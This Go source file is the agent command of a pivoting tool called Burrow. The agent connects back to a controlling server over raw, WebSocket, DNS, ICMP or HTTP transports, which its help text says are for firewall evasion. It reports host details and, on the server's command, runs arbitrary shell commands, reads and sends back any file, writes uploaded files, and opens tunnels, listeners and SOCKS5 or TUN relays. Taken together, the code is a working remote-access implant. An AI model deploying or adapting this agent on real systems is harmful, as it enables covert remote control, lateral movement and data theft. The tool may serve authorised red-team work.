package cmd

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"os/signal"
	"runtime"
	"syscall"
	"time"
	"os/exec"
	"strings"
	"path/filepath"
	"sync"

	"github.com/loudmumble/burrow/internal/certgen"
	"github.com/loudmumble/burrow/internal/mux"
	"github.com/loudmumble/burrow/internal/netstack"
	"github.com/loudmumble/burrow/internal/protocol"
	"github.com/loudmumble/burrow/internal/relay"
	"github.com/loudmumble/burrow/internal/transport"
	_ "github.com/loudmumble/burrow/internal/transport/dns"
	_ "github.com/loudmumble/burrow/internal/transport/icmp"
	_ "github.com/loudmumble/burrow/internal/transport/raw"
	_ "github.com/loudmumble/burrow/internal/transport/ws"
	_ "github.com/loudmumble/burrow/internal/transport/http"
	"github.com/loudmumble/burrow/internal/tunnel"
	"github.com/spf13/cobra"
)

var agentCmd = &cobra.Command{
	Use:   "agent",
	Short: "Connect back to a Burrow proxy server",
	Long: `Start the Burrow agent that connects back to a proxy server.

The agent establishes a multiplexed connection to the server and waits for
tunnel and route commands. TLS is enabled by default with certificate
fingerprint verification. Supports multiple transports for firewall evasion.`,
	Example: `  burrow agent -c 10.0.0.1:11601
  burrow agent -c 10.0.0.1:11601 --fp AB:CD:EF:01:23:45:67:89
  burrow agent -c wss://10.0.0.1:443 -t ws
  burrow agent -c 10.0.0.1:5353 -t dns
  burrow agent -c 10.0.0.1 -t icmp`,
	Run: runAgent,
}

func init() {
	rootCmd.AddCommand(agentCmd)

	agentCmd.Flags().StringP("connect", "c", "", "Server address to connect to (required)")
	agentCmd.Flags().StringP("fp", "f", "", "Expected server TLS fingerprint for verification")
	agentCmd.Flags().String("fingerprint", "", "Alias for --fp")
	agentCmd.Flags().MarkHidden("fingerprint")
	agentCmd.Flags().Int("max-retries", 0, "Max reconnection attempts (0 = infinite)")
	agentCmd.Flags().StringP("transport", "t", "raw", "Transport protocol (raw, ws, dns, icmp, http)")
	agentCmd.Flags().Bool("no-tls", false, "Connect without TLS")
	agentCmd.MarkFlagRequired("connect")
}

func runAgent(cmd *cobra.Command, _ []string) {
	serverAddr, _ := cmd.Flags().GetString("connect")
	fp, _ := cmd.Flags().GetString("fp")
	if fp == "" {
		fp, _ = cmd.Flags().GetString("fingerprint")
	}
	fingerprint := fp
	maxRetry, _ := cmd.Flags().GetInt("max-retries")
	transportName, _ := cmd.Flags().GetString("transport")
	noTLS, _ := cmd.Flags().GetBool("no-tls")

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go func() {
		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		<-sigChan
		fmt.Println("\n[*] Shutting down agent...")
		cancel()
	}()

	retryCount := 0
	for {
		if ctx.Err() != nil {
			return
		}

		conn, err := dialServer(ctx, serverAddr, fingerprint, noTLS, transportName)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] Connection failed: %v\n", err)
			retryCount++
			if maxRetry > 0 && retryCount > maxRetry {
				fmt.Fprintf(os.Stderr, "[!] Max retries (%d) exceeded, giving up\n", maxRetry)
				os.Exit(1)
			}
			delay := reconnectBackoff(retryCount)
			fmt.Printf("[*] Reconnecting in %s (attempt %d)...\n", delay, retryCount)
			select {
			case <-time.After(delay):
				continue
			case <-ctx.Done():
				return
			}
		}

		retryCount = 0
		fmt.Printf("[*] Connected to %s\n", serverAddr)

		if err := agentSession(ctx, conn); err != nil {
			fmt.Fprintf(os.Stderr, "[!] Session error: %v\n", err)
		}

		if ctx.Err() != nil {
			return
		}

		if maxRetry == 0 {
			fmt.Println("[*] Disconnected, reconnecting...")
			continue
		}
		retryCount++
		if retryCount > maxRetry {
			fmt.Fprintf(os.Stderr, "[!] Max retries (%d) exceeded\n", maxRetry)
			os.Exit(1)
		}
		delay := reconnectBackoff(retryCount)
		fmt.Printf("[*] Reconnecting in %s (attempt %d)...\n", delay, retryCount)
		select {
		case <-time.After(delay):
		case <-ctx.Done():
			return
		}
	}
}

func dialServer(ctx context.Context, addr, fingerprint string, noTLS bool, transportName string) (net.Conn, error) {
	var tlsCfg *tls.Config
	if !noTLS {
		tlsCfg = buildClientTLSConfig(fingerprint)
	}

	// Auto-prefix ws:// or wss:// for WebSocket transport if not present
	if transportName == "ws" && !strings.HasPrefix(addr, "ws://") && !strings.HasPrefix(addr, "wss://") {
		if noTLS {
			addr = "ws://" + addr
		} else {
			addr = "wss://" + addr
		}
	}

	// Auto-prefix http:// or https:// for HTTP transport if not present
	if transportName == "http" && !strings.HasPrefix(addr, "http://") && !strings.HasPrefix(addr, "https://") {
		if noTLS {
			addr = "http://" + addr
		} else {
			addr = "https://" + addr
		}
	}

	newTransport, ok := transport.Registry[transportName]
	if !ok {
		return nil, fmt.Errorf("unknown transport: %s", transportName)
	}

	t := newTransport()
	return t.Dial(ctx, addr, tlsCfg)
}

func buildClientTLSConfig(fingerprint string) *tls.Config {
	if fingerprint == "" {
		return &tls.Config{
			MinVersion:         tls.VersionTLS12,
			InsecureSkipVerify: true,
		}
	}

	expected := strings.ToUpper(strings.TrimSpace(fingerprint))
	return &tls.Config{
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: true,
		VerifyPeerCertificate: func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
			if len(rawCerts) == 0 {
				return errors.New("no peer certificates presented")
			}
			cert, err := x509.ParseCertificate(rawCerts[0])
			if err != nil {
				return fmt.Errorf("parse peer certificate: %w", err)
			}
			actual := certgen.Fingerprint(cert)
			if !strings.HasPrefix(actual, expected) {
				return fmt.Errorf("%w: expected %s, got %s",
					certgen.ErrFingerprintMismatch, expected, actual)
			}
			return nil
		},
	}
}

func agentSession(ctx context.Context, conn net.Conn) error {
	defer conn.Close()

	sess, err := mux.NewClientSession(conn)
	if err != nil {
		return fmt.Errorf("mux session: %w", err)
	}
	defer sess.Close()

	ctrl, err := sess.Open()
	if err != nil {
		return fmt.Errorf("open control stream: %w", err)
	}
	defer ctrl.Close()

	hostname, _ := os.Hostname()
	localIPs := getLocalIPs()

	handshake := &protocol.HandshakePayload{
		Hostname: hostname,
		OS:       runtime.GOOS,
		IPs:      localIPs,
		PID:      os.Getpid(),
		Version:  version,
	}
	msg, err := protocol.EncodeHandshake(handshake)
	if err != nil {
		return fmt.Errorf("encode handshake: %w", err)
	}
	if err := protocol.WriteMessage(ctrl, msg); err != nil {
		return fmt.Errorf("send handshake: %w", err)
	}

	ackMsg, err := protocol.ReadMessage(ctrl)
	if err != nil {
		return fmt.Errorf("read handshake ack: %w", err)
	}
	ack, err := protocol.DecodeHandshakeAck(ackMsg)
	if err != nil {
		return fmt.Errorf("decode handshake ack: %w", err)
	}
	fmt.Printf("[*] Session ID: %s (server %s)\n", ack.SessionID, ack.ProxyVersion)

	// Start proxy stream acceptor for SOCKS5 routing.
	go acceptProxyStreams(ctx, sess)

	return commandLoop(ctx, ctrl, sess)
}

func commandLoop(ctx context.Context, ctrl net.Conn, sess *mux.Session) error {
	activeTunnels := make(map[string]*tunnel.Tunnel)
	activeListeners := make(map[string]net.Listener)
	activeRoutes := make(map[string]string)
	var ctrlMu sync.Mutex

	var tunNS *netstack.Stack
	var tunStream net.Conn
	var tunCancel context.CancelFunc
	var tunCloseDone chan struct{}

	defer func() {
		if tunCancel != nil {
			tunCancel()
		}
		if tunStream != nil {
			tunStream.Close()
		}
		if tunNS != nil {
			tunNS.Close()
		}
		for _, t := range activeTunnels {
			t.Stop()
		}
		for _, l := range activeListeners {
			l.Close()
		}
	}()

	msgCh := make(chan *protocol.Message, 32)
	errCh := make(chan error, 1)

	go func() {
		for {
			msg, err := protocol.ReadMessage(ctrl)
			if err != nil {
				select {
				case errCh <- err:
				default:
				}
				return
			}
			select {
			case msgCh <- msg:
			case <-ctx.Done():
				return
			}
		}
	}()

	for {
		select {
		case <-ctx.Done():
			return nil

		case err := <-errCh:
			return fmt.Errorf("read command: %w", err)

		case msg := <-msgCh:
			switch msg.Type {
			case protocol.MsgPing:
				ctrlMu.Lock()
				err := protocol.WriteMessage(ctrl, protocol.NewPong())
				ctrlMu.Unlock()
				if err != nil {
					return fmt.Errorf("send pong: %w", err)
				}

			case protocol.MsgTunnelRequest:
				req, err := protocol.DecodeTunnelRequest(msg)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] Bad tunnel request: %v\n", err)
					continue
				}
				fmt.Printf("[*] Tunnel request: %s %s -> %s (%s)\n",
					req.Direction, req.ListenAddr, req.RemoteAddr, req.Protocol)

				switch req.Direction {
				case "local":
					t := tunnel.NewLocalForward(req.ListenAddr, req.RemoteAddr)
					startErr := t.StartWithContext(ctx)
					ackPayload := &protocol.TunnelAckPayload{ID: req.ID}
					if startErr != nil {
						ackPayload.Error = startErr.Error()
					} else {
						ackPayload.BoundAddr = t.Addr()
						activeTunnels[req.ID] = t
					}
					ackMsg, encErr := protocol.EncodeTunnelAck(ackPayload)
					if encErr != nil {
						fmt.Fprintf(os.Stderr, "[!] Encode tunnel ack: %v\n", encErr)
						continue
					}
					ctrlMu.Lock()
					protocol.WriteMessage(ctrl, ackMsg)
					ctrlMu.Unlock()

				case "remote", "reverse":
					// Remote tunnel: agent listens, forwards connections through yamux back to server
					listenProto := req.Protocol
					if listenProto == "" {
						listenProto = "tcp"
					}
					ln, listenErr := net.Listen(listenProto, req.ListenAddr)
					ackPayload := &protocol.TunnelAckPayload{ID: req.ID}
					if listenErr != nil {
						ackPayload.Error = listenErr.Error()
					} else {
						ackPayload.BoundAddr = ln.Addr().String()
						activeListeners[req.ID] = ln
						go remoteTunnelAcceptLoop(ctx, ln, sess, req.RemoteAddr)
					}
					ackMsg, encErr := protocol.EncodeTunnelAck(ackPayload)
					if encErr != nil {
						fmt.Fprintf(os.Stderr, "[!] Encode tunnel ack: %v\n", encErr)
						continue
					}
					ctrlMu.Lock()
					protocol.WriteMessage(ctrl, ackMsg)
					ctrlMu.Unlock()

				default:
					ackPayload := &protocol.TunnelAckPayload{
						ID:    req.ID,
						Error: fmt.Sprintf("unknown direction: %s", req.Direction),
					}
					ackMsg, encErr := protocol.EncodeTunnelAck(ackPayload)
					if encErr != nil {
						fmt.Fprintf(os.Stderr, "[!] Encode tunnel ack: %v\n", encErr)
						continue
					}
					ctrlMu.Lock()
					protocol.WriteMessage(ctrl, ackMsg)
					ctrlMu.Unlock()
				}

			case protocol.MsgRouteAdd:
				route, err := protocol.DecodeRouteAdd(msg)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] Bad route add: %v\n", err)
					continue
				}
				activeRoutes[route.CIDR] = route.Gateway
				fmt.Printf("[*] Route added: %s via %s\n", route.CIDR, route.Gateway)

			case protocol.MsgRouteRemove:
				route, err := protocol.DecodeRouteRemove(msg)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] Bad route remove: %v\n", err)
					continue
				}
				delete(activeRoutes, route.CIDR)
				fmt.Printf("[*] Route removed: %s\n", route.CIDR)

			case protocol.MsgTunnelClose:
				tunnelID, err := protocol.DecodeTunnelClose(msg)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] Bad tunnel close: %v\n", err)
					continue
				}
				if t, ok := activeTunnels[tunnelID]; ok {
					t.Stop()
					delete(activeTunnels, tunnelID)
					fmt.Printf("[*] Tunnel closed: %s\n", tunnelID)
				} else if l, ok := activeListeners[tunnelID]; ok {
					l.Close()
					delete(activeListeners, tunnelID)
					fmt.Printf("[*] Remote tunnel closed: %s\n", tunnelID)
				} else {
					fmt.Printf("[*] Tunnel close (unknown ID): %s\n", tunnelID)
				}

			case protocol.MsgListenerRequest:
				req, err := protocol.DecodeListenerRequest(msg)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] Bad listener request: %v\n", err)
					continue
				}
				fmt.Printf("[*] Listener request: %s -> %s\n",
					req.ListenAddr, req.ForwardAddr)

				ln, listenErr := net.Listen("tcp", req.ListenAddr)
				ackPayload := &protocol.ListenerAckPayload{ID: req.ID}
				if listenErr != nil {
					ackPayload.Error = listenErr.Error()
				} else {
					ackPayload.BoundAddr = ln.Addr().String()
					activeListeners[req.ID] = ln
					go acceptAndRelay(ctx, ln, req.ForwardAddr)
				}
				ackMsg, encErr := protocol.EncodeListenerAck(ackPayload)
				if encErr != nil {
					fmt.Fprintf(os.Stderr, "[!] Encode listener ack: %v\n", encErr)
					continue
				}
				ctrlMu.Lock()
				protocol.WriteMessage(ctrl, ackMsg)
				ctrlMu.Unlock()

			case protocol.MsgTunStart:
				fmt.Println("[*] TUN start requested by server")
				// Wait for any previous netstack close to finish.
				if tunCloseDone != nil {
					<-tunCloseDone
					tunCloseDone = nil
				}
				ns, nsErr := netstack.New(netstack.Opts{})
				ackPayload := &protocol.TunStartAckPayload{}
				if nsErr != nil {
					ackPayload.Error = nsErr.Error()
				}
				ackMsg, encErr := protocol.EncodeTunStartAck(ackPayload)
				if encErr != nil {
					fmt.Fprintf(os.Stderr, "[!] Encode TUN start ack: %v\n", encErr)
					continue
				}
				ctrlMu.Lock()
				protocol.WriteMessage(ctrl, ackMsg)
				ctrlMu.Unlock()
				if nsErr != nil {
					fmt.Fprintf(os.Stderr, "[!] TUN start failed: %v\n", nsErr)
					continue
				}
				dataStream, streamErr := sess.Open()
				if streamErr != nil {
					ns.Close()
					fmt.Fprintf(os.Stderr, "[!] TUN data stream failed: %v\n", streamErr)
					continue
				}
				if _, writeErr := dataStream.Write([]byte{0x01}); writeErr != nil {
					dataStream.Close()
					ns.Close()
					fmt.Fprintf(os.Stderr, "[!] TUN stream type write failed: %v\n", writeErr)
					continue
				}
				tunNS = ns
				tunStream = dataStream
				tunCtx, cancel := context.WithCancel(ctx)
				tunCancel = cancel
				go tunAgentRelay(tunCtx, dataStream, ns)
				fmt.Println("[*] TUN mode active")

			case protocol.MsgTunStop:
				fmt.Println("[*] TUN stop requested")
				if tunCancel != nil {
					tunCancel()
					tunCancel = nil
				}
				if tunStream != nil {
					tunStream.Close()
					tunStream = nil
				}
				// Close netstack asynchronously — Close() blocks on wg.Wait()
				// for active TCP connections. Don't block the command loop.
				if tunNS != nil {
					ns := tunNS
					tunNS = nil
					done := make(chan struct{})
					go func() {
						ns.Close()
						close(done)
					}()
					tunCloseDone = done
				}
				fmt.Println("[*] TUN mode stopped")


			case protocol.MsgExecRequest:
				req, err := protocol.DecodeExecRequest(msg)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] Bad exec request: %v\n", err)
					continue
				}
				fmt.Printf("[*] Exec request: %s\n", req.Command)
				go func(id, command string) {
					defer func() {
						if r := recover(); r != nil {
							fmt.Fprintf(os.Stderr, "[!] Panic in exec handler: %v\n", r)
						}
					}()
					resp := &protocol.ExecResponsePayload{ID: id}
					var cmd *exec.Cmd
					if runtime.GOOS == "windows" {
						cmd = exec.Command("cmd", "/C", command)
					} else {
						cmd = exec.Command("sh", "-c", command)
					}
					out, execErr := cmd.CombinedOutput()
					resp.Output = strings.TrimRight(string(out), "\r\n")
					if execErr != nil {
						resp.Error = execErr.Error()
					}
					respMsg, encErr := protocol.EncodeExecResponse(resp)
					if encErr != nil {
						fmt.Fprintf(os.Stderr, "[!] Encode exec response: %v\n", encErr)
						return
					}
					ctrlMu.Lock()
					protocol.WriteMessage(ctrl, respMsg)
					ctrlMu.Unlock()
				}(req.ID, req.Command)

			case protocol.MsgFileDownloadRequest:
				req, err := protocol.DecodeFileDownloadRequest(msg)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] Bad file download request: %v\n", err)
					continue
				}
				fmt.Printf("[*] File download request: %s\n", req.FilePath)
				go func(id, filePath string) {
					defer func() {
						if r := recover(); r != nil {
							fmt.Fprintf(os.Stderr, "[!] Panic in file download handler: %v\n", r)
						}
					}()
					resp := &protocol.FileDownloadResponsePayload{ID: id}
					data, readErr := os.ReadFile(filePath)
					if readErr != nil {
						resp.Error = readErr.Error()
					} else {
						resp.FileName = filepath.Base(filePath)
						resp.Data = data
						resp.Size = int64(len(data))
					}
					respMsg, encErr := protocol.EncodeFileDownloadResponse(resp)
					if encErr != nil {
						fmt.Fprintf(os.Stderr, "[!] Encode file download response: %v\n", encErr)
						return
					}
					ctrlMu.Lock()
					protocol.WriteMessage(ctrl, respMsg)
					ctrlMu.Unlock()
				}(req.ID, req.FilePath)

			case protocol.MsgFileUploadRequest:
				req, err := protocol.DecodeFileUploadRequest(msg)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] Bad file upload request: %v\n", err)
					continue
				}
				fmt.Printf("[*] File upload request: %s\n", req.FilePath)
				go func(id, filePath string, data []byte) {
					defer func() {
						if r := recover(); r != nil {
							fmt.Fprintf(os.Stderr, "[!] Panic in file upload handler: %v\n", r)
						}
					}()
					resp := &protocol.FileUploadResponsePayload{ID: id}
					writeErr := os.WriteFile(filePath, data, 0644)
					if writeErr != nil {
						resp.Error = writeErr.Error()
					} else {
						resp.Size = int64(len(data))
					}
					respMsg, encErr := protocol.EncodeFileUploadResponse(resp)
					if encErr != nil {
						fmt.Fprintf(os.Stderr, "[!] Encode file upload response: %v\n", encErr)
						return
					}
					ctrlMu.Lock()
					protocol.WriteMessage(ctrl, respMsg)
					ctrlMu.Unlock()
				}(req.ID, req.FilePath, req.Data)
			case protocol.MsgError:
				errStr, _ := protocol.DecodeError(msg)
				return fmt.Errorf("server error: %s", errStr)

			default:
				fmt.Fprintf(os.Stderr, "[!] Unknown message type: %s\n", msg.Type)
			}
		}
	}
}

func acceptAndRelay(ctx context.Context, ln net.Listener, forwardAddr string) {
	go func() {
		<-ctx.Done()
		ln.Close()
	}()
	for {
		conn, err := ln.Accept()
		if err != nil {
			if ctx.Err() != nil || errors.Is(err, net.ErrClosed) {
				return
			}
			continue
		}
		go func(c net.Conn) {
			defer c.Close()
			relay.TuneConn(c)
			remote, err := net.DialTimeout("tcp", forwardAddr, 10*time.Second)
			if err != nil {
				return
			}
			defer remote.Close()
			relay.TuneConn(remote)
			done := make(chan struct{}, 2)
			go func() {
				relay.CopyBuffered(remote, c)
				if tc, ok := remote.(*net.TCPConn); ok {
					tc.CloseWrite()
				}
				done <- struct{}{}
			}()
			go func() {
				relay.CopyBuffered(c, remote)
				if tc, ok := c.(*net.TCPConn); ok {
					tc.CloseWrite()
				}
				done <- struct{}{}
			}()
			<-done
			<-done // Wait for both goroutines
		}(conn)
	}
}

func getLocalIPs() []string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return nil
	}
	var ips []string
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			ips = append(ips, ipnet.IP.String())
		}
	}
	return ips
}

func reconnectBackoff(attempt int) time.Duration {
	return transport.Backoff(time.Second, attempt-1)
}

func tunAgentRelay(ctx context.Context, stream net.Conn, ns *netstack.Stack) {
	injectDone := make(chan struct{})
	// stream → netstack (receive packets from server, inject into gvisor)
	go func() {
		defer close(injectDone)
		for {
			pkt, err := protocol.ReadRawPacket(stream)
			if err != nil {
				return
			}
			ns.InjectPacket(pkt)
			protocol.PutPacketBuf(pkt)
		}
	}()
	// netstack → stream (read response packets from gvisor, send to server)
	for {
		select {
		case <-injectDone:
			// stream→netstack goroutine died, stop the reverse direction too
			return
		default:
		}
		pkt, err := ns.ReadPacket(ctx)
		if err != nil {
			return
		}
		if err := protocol.WriteRawPacket(stream, pkt); err != nil {
			protocol.PutPacketBuf(pkt)
			return
		}
		protocol.PutPacketBuf(pkt)
	}
}

func remoteTunnelAcceptLoop(ctx context.Context, ln net.Listener, sess *mux.Session, remoteAddr string) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Fprintf(os.Stderr, "[!] Panic in remote tunnel accept loop: %v\n", r)
		}
	}()
	go func() {
		<-ctx.Done()
		ln.Close()
	}()
	for {
		conn, err := ln.Accept()
		if err != nil {
			if ctx.Err() != nil || errors.Is(err, net.ErrClosed) {
				return
			}
			continue
		}
		go remoteTunnelRelay(conn, sess, remoteAddr)
	}
}

func remoteTunnelRelay(conn net.Conn, sess *mux.Session, remoteAddr string) {
	defer conn.Close()
	relay.TuneConn(conn)
	stream, err := sess.Open()
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] Remote tunnel: failed to open yamux stream: %v\n", err)
		return
	}
	defer stream.Close()

	// Write stream type header: [0x02] [2-byte addr len BE] [addr bytes]
	addrBytes := []byte(remoteAddr)
	hdr := make([]byte, 3+len(addrBytes))
	hdr[0] = 0x02 // Stream type: remote tunnel
	binary.BigEndian.PutUint16(hdr[1:3], uint16(len(addrBytes)))
	copy(hdr[3:], addrBytes)
	if _, err := stream.Write(hdr); err != nil {
		fmt.Fprintf(os.Stderr, "[!] Remote tunnel: failed to write header: %v\n", err)
		return
	}

	// Bidirectional relay between incoming connection and yamux stream
	done := make(chan struct{}, 2)
	go func() {
		relay.CopyBuffered(stream, conn)
		// Stream EOF — close conn write side to signal client
		if tc, ok := conn.(*net.TCPConn); ok {
			tc.CloseWrite()
		}
		done <- struct{}{}
	}()
	go func() {
		relay.CopyBuffered(conn, stream)
		// Client closed — close stream to signal server
		stream.Close()
		done <- struct{}{}
	}()
	<-done
	<-done
}

// acceptProxyStreams accepts server-initiated yamux streams for SOCKS5 proxy
// routing. Each stream carries a [2-byte addr len][addr] header followed by
// bidirectional TCP relay to the target.
func acceptProxyStreams(ctx context.Context, sess *mux.Session) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Fprintf(os.Stderr, "[!] Panic in proxy stream acceptor: %v\n", r)
		}
	}()
	for {
		stream, err := sess.Accept()
		if err != nil {
			if ctx.Err() != nil {
				return
			}
			return
		}
		go handleProxyStream(ctx, stream)
	}
}

func handleProxyStream(_ context.Context, stream net.Conn) {
	defer stream.Close()

	// Read [2-byte addr len][addr bytes]
	lenBuf := make([]byte, 2)
	if _, err := io.ReadFull(stream, lenBuf); err != nil {
		return
	}
	addrLen := binary.BigEndian.Uint16(lenBuf)
	if addrLen == 0 || addrLen > 512 {
		return
	}
	addrBuf := make([]byte, addrLen)
	if _, err := io.ReadFull(stream, addrBuf); err != nil {
		return
	}
	target := string(addrBuf)

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()
	relay.TuneConn(conn)

	done := make(chan struct{}, 2)
	go func() {
		relay.CopyBuffered(conn, stream)
		if tc, ok := conn.(*net.TCPConn); ok {
			tc.CloseWrite()
		}
		done <- struct{}{}
	}()
	go func() {
		relay.CopyBuffered(stream, conn)
		// Target closed — close stream to signal EOF to server
		stream.Close()
		done <- struct{}{}
	}()
	<-done
	<-done
}
